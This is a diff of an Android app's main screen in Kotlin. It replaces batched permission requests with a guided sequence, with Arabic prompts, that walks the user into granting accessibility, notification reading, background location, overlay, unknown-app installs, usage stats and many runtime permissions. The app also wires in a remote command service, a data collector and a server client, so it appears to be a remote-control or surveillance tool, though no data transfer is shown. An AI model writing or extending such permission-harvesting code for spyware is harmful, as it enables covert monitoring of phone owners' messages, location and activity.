@@ -1,6 +1,9 @@
 package com.abuzahra.manager
 
 import android.Manifest
+import android.app.Activity
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -8,15 +11,17 @@ import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.Button
+import android.widget.ProgressBar
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.abuzahra.manager.api.ApiClient
-import com.abuzahra.manager.api.FirebaseManager
 import com.abuzahra.manager.executor.DataCollector
 import com.abuzahra.manager.service.CommandService
+import com.abuzahra.manager.service.MyAccessibilityService
+import com.abuzahra.manager.service.MyNotificationListenerService
 import com.abuzahra.manager.util.DeviceUtils
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -28,7 +33,19 @@ class MainActivity : AppCompatActivity() {
         private const val PERMISSION_REQUEST = 1001
         private const val PERMISSION_REQUEST_BATCH2 = 1002
         private const val PERMISSION_REQUEST_BATCH3 = 1003
+        private const val REQUEST_CODE_LOCATION = 1004
+        private const val REQUEST_CODE_OVERLAY = 1005
+        private const val REQUEST_CODE_NOTIFICATION_LISTENER = 1006
+        private const val REQUEST_CODE_ACCESSIBILITY = 1007
+        private const val REQUEST_CODE_USAGE_STATS = 1008
+        private const val REQUEST_CODE_WRITE_SETTINGS = 1009
+        private const val REQUEST_CODE_BATTERY_OPT = 1010
+        private const val REQUEST_CODE_INSTALL_PACKAGES = 1011
+        private const val REQUEST_CODE_UNKNOWN_APPS = 1012
     }
+
+    private var currentPermissionIndex = 0
+    private var isRequestingPermissions = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -68,14 +85,9 @@ class MainActivity : AppCompatActivity() {
         // Update permissions count
         updatePermissionCount(textPermissions)
 
-        // Auto-request permissions on first launch
-        requestPermissionsInBatches()
-
         // Request permissions button
         btnPermissions.setOnClickListener {
-            requestPermissionsInBatches()
-            requestSpecialPermissions()
-            updatePermissionCount(textPermissions)
+            startSequentialPermissionRequest()
         }
 
         // Restart service
@@ -118,6 +130,11 @@ class MainActivity : AppCompatActivity() {
         } catch (_: Exception) {}
         // Refresh permission count
         updatePermissionCount(findViewById(R.id.textPermissions))
+
+        // Continue with next permission if in sequential mode
+        if (isRequestingPermissions) {
+            continuePermissionRequest()
+        }
     }
 
     private fun checkServerStatus(textStatus: TextView) {
@@ -143,13 +160,19 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updatePermissionCount(textView: TextView) {
-        val total = getRequiredPermissions().size
+        val runtimePerms = getRuntimePermissions()
         var granted = 0
-        for (perm in getRequiredPermissions()) {
+        for (perm in runtimePerms) {
             if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                 granted++
             }
         }
+
+        // Add special permissions
+        val specialPerms = checkSpecialPermissions()
+        granted += specialPerms.count { it.value }
+        val total = runtimePerms.size + specialPerms.size
+
         textView.text = "Permissions: $granted/$total"
         // Color: green if all granted, yellow if >50%, red if <50%
         val color = when {
@@ -160,7 +183,60 @@ class MainActivity : AppCompatActivity() {
         textView.setTextColor(getColor(color))
     }
 
-    private fun getRequiredPermissions(): Array<String> {
+    private fun checkSpecialPermissions(): Map<String, Boolean> {
+        return mapOf(
+            "overlay" to (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)),
+            "usage_stats" to hasUsageStatsPermission(),
+            "write_settings" to (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this)),
+            "battery_opt" to isBatteryOptimizationDisabled(),
+            "notification_listener" to isNotificationListenerEnabled(),
+            "accessibility" to isAccessibilityServiceEnabled(),
+            "install_packages" to (Build.VERSION.SDK_INT < Build.VERSION_CODES.O || canRequestPackageInstalls())
+        )
+    }
+
+    private fun hasUsageStatsPermission(): Boolean {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return true
+        try {
+            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
+            val mode = appOps.checkOpNoThrow(
+                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
+                android.os.Process.myUid(),
+                packageName
+            )
+            return mode == android.app.AppOpsManager.MODE_ALLOWED
+        } catch (_: Exception) {
+            return false
+        }
+    }
+
+    private fun isBatteryOptimizationDisabled(): Boolean {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+            return powerManager.isIgnoringBatteryOptimizations(packageName)
+        } catch (_: Exception) {
+            return false
+        }
+    }
+
+    private fun isNotificationListenerEnabled(): Boolean {
+        return MyNotificationListenerService.isEnabled(this)
+    }
+
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        return MyAccessibilityService.isEnabled(this)
+    }
+
+    private fun canRequestPackageInstalls(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            packageManager.canRequestPackageInstalls()
+        } else {
+            true
+        }
+    }
+
+    private fun getRuntimePermissions(): Array<String> {
         val perms = mutableListOf(
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_CALL_LOG,
@@ -181,7 +257,21 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.BLUETOOTH_CONNECT,
             Manifest.permission.VIBRATE,
             Manifest.permission.NFC,
+            Manifest.permission.BODY_SENSORS,
+            Manifest.permission.ACTIVITY_RECOGNITION
         )
+
+        // Add nearby devices permissions for Android 12+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            perms.add(Manifest.permission.BLUETOOTH_SCAN)
+            perms.add(Manifest.permission.BLUETOOTH_ADVERTISE)
+        }
+
+        // Add nearby wifi devices permission for Android 13+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.NEARBY_WIFI_DEVICES)
+        }
+
         // Add storage permissions based on SDK
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
@@ -198,37 +288,60 @@ class MainActivity : AppCompatActivity() {
         return perms.toTypedArray()
     }
 
-    private fun requestPermissionsInBatches() {
-        val ungranted = getRequiredPermissions().filter {
+    // ===== SEQUENTIAL PERMISSION REQUEST =====
+
+    private fun startSequentialPermissionRequest() {
+        currentPermissionIndex = 0
+        isRequestingPermissions = true
+        continuePermissionRequest()
+    }
+
+    private fun continuePermissionRequest() {
+        val textPermissions = findViewById<TextView>(R.id.textPermissions)
+
+        while (currentPermissionIndex < 20) {
+            when (currentPermissionIndex) {
+                0 -> requestRuntimePermissions()
+                1 -> requestOverlayPermission()
+                2 -> requestBatteryOptimization()
+                3 -> requestUsageStatsPermission()
+                4 -> requestWriteSettingsPermission()
+                5 -> requestNotificationListenerPermission()
+                6 -> requestAccessibilityPermission()
+                7 -> requestInstallPackagesPermission()
+                8 -> requestLocationBackgroundPermission()
+                else -> {
+                    // All permissions requested
+                    isRequestingPermissions = false
+                    updatePermissionCount(textPermissions)
+                    Toast.makeText(this, "✅ تم طلب جميع الصلاحيات", Toast.LENGTH_LONG).show()
+                    return
+                }
+            }
+            currentPermissionIndex++
+            return // Wait for user to return from settings
+        }
+    }
+
+    private fun requestRuntimePermissions() {
+        val ungranted = getRuntimePermissions().filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
         if (ungranted.isEmpty()) {
-            // All runtime permissions granted, request special ones
-            requestSpecialPermissions()
+            // All runtime permissions granted, move to next
             return
         }
 
-        // Request in batches of 10 (Android system limit)
-        val batch1 = ungranted.take(10)
-        ActivityCompat.requestPermissions(this, batch1.toTypedArray(), PERMISSION_REQUEST)
-
-        // Remaining permissions will be requested in onRequestPermissionsResult
+        // Request in batches of 10
+        ActivityCompat.requestPermissions(
+            this,
+            ungranted.take(10).toTypedArray(),
+            PERMISSION_REQUEST
+        )
     }
 
-    private fun requestSpecialPermissions() {
-        // Battery optimization
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                val intent = Intent(
-                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                    Uri.parse("package:$packageName")
-                )
-                startActivity(intent)
-            } catch (_: Exception) {}
-        }
-
-        // System alert window (draw over other apps)
+    private fun requestOverlayPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 try {
@@ -236,56 +349,95 @@ class MainActivity : AppCompatActivity() {
                         Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:$packageName")
                     )
+                    Toast.makeText(this, "🔔 فعّل صلاحية 'الظهور فوق التطبيقات الأخرى'", Toast.LENGTH_LONG).show()
                     startActivity(intent)
                 } catch (_: Exception) {}
             }
         }
+    }
 
-        // Usage stats (for screen time)
-        try {
-            val appUsageIntent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
-            startActivity(appUsageIntent)
-        } catch (_: Exception) {}
+    private fun requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!isBatteryOptimizationDisabled()) {
+                try {
+                    val intent = Intent(
+                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Uri.parse("package:$packageName")
+                    )
+                    Toast.makeText(this, "🔋 فعّل 'تجاهل تحسين البطارية'", Toast.LENGTH_LONG).show()
+                    startActivity(intent)
+                } catch (_: Exception) {}
+            }
+        }
+    }
 
-        // Write settings
+    private fun requestUsageStatsPermission() {
+        if (!hasUsageStatsPermission()) {
+            try {
+                Toast.makeText(this, "📊 فعّل صلاحية 'الوصول إلى استخدام التطبيقات'", Toast.LENGTH_LONG).show()
+                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun requestWriteSettingsPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.System.canWrite(this)) {
                 try {
                     val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                     intent.data = Uri.parse("package:$packageName")
+                    Toast.makeText(this, "⚙️ فعّل صلاحية 'تعديل إعدادات النظام'", Toast.LENGTH_LONG).show()
                     startActivity(intent)
                 } catch (_: Exception) {}
             }
         }
+    }
 
-        // Notification access (for reading notifications)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+    private fun requestNotificationListenerPermission() {
+        if (!isNotificationListenerEnabled()) {
             try {
-                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+                Toast.makeText(this, "🔔 فعّل صلاحية 'الوصول إلى الإشعارات'", Toast.LENGTH_LONG).show()
+                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                 startActivity(intent)
             } catch (_: Exception) {}
         }
+    }
 
-        // Install unknown apps (for app installation)
+    private fun requestAccessibilityPermission() {
+        if (!isAccessibilityServiceEnabled()) {
+            try {
+                Toast.makeText(this, "♿ فعّل صلاحية 'إمكانية الوصول' من القائمة", Toast.LENGTH_LONG).show()
+                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                startActivity(intent)
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun requestInstallPackagesPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            try {
-                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
-                intent.data = Uri.parse("package:$packageName")
-                startActivity(intent)
-            } catch (_: Exception) {}
+            if (!canRequestPackageInstalls()) {
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
+                    intent.data = Uri.parse("package:$packageName")
+                    Toast.makeText(this, "📦 فعّل صلاحية 'التثبيت من مصادر غير معروفة'", Toast.LENGTH_LONG).show()
+                    startActivity(intent)
+                } catch (_: Exception) {}
+            }
         }
+    }
 
-        // Device admin
-        try {
-            val deviceAdminIntent = Intent(Settings.ACTION_SECURITY_SETTINGS)
-            startActivity(deviceAdminIntent)
-        } catch (_: Exception) {}
-
-        // Accessibility service
-        try {
-            val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            startActivity(accessibilityIntent)
-        } catch (_: Exception) {}
+    private fun requestLocationBackgroundPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "📍 فعّل صلاحية 'الموقع في الخلفية'", Toast.LENGTH_LONG).show()
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                    REQUEST_CODE_LOCATION
+                )
+            }
+        }
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
@@ -293,24 +445,29 @@ class MainActivity : AppCompatActivity() {
         val textPermissions = findViewById<TextView>(R.id.textPermissions)
         updatePermissionCount(textPermissions)
 
-        // Check if there are more permissions to request
-        val stillNeeded = getRequiredPermissions().filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-
-        if (stillNeeded.isNotEmpty() && requestCode == PERMISSION_REQUEST) {
-            // Request next batch
-            ActivityCompat.requestPermissions(
-                this,
-                stillNeeded.take(10).toTypedArray(),
-                PERMISSION_REQUEST_BATCH2
-            )
-        } else if (stillNeeded.isNotEmpty() && requestCode == PERMISSION_REQUEST_BATCH2) {
-            ActivityCompat.requestPermissions(
-                this,
-                stillNeeded.take(10).toTypedArray(),
-                PERMISSION_REQUEST_BATCH3
-            )
+        // Continue requesting remaining permissions
+        if (requestCode == PERMISSION_REQUEST) {
+            val stillNeeded = getRuntimePermissions().filter {
+                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+            }
+            if (stillNeeded.isNotEmpty()) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    stillNeeded.take(10).toTypedArray(),
+                    PERMISSION_REQUEST_BATCH2
+                )
+            }
+        } else if (requestCode == PERMISSION_REQUEST_BATCH2) {
+            val stillNeeded = getRuntimePermissions().filter {
+                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+            }
+            if (stillNeeded.isNotEmpty()) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    stillNeeded.take(10).toTypedArray(),
+                    PERMISSION_REQUEST_BATCH3
+                )
+            }
         }
     }
 }
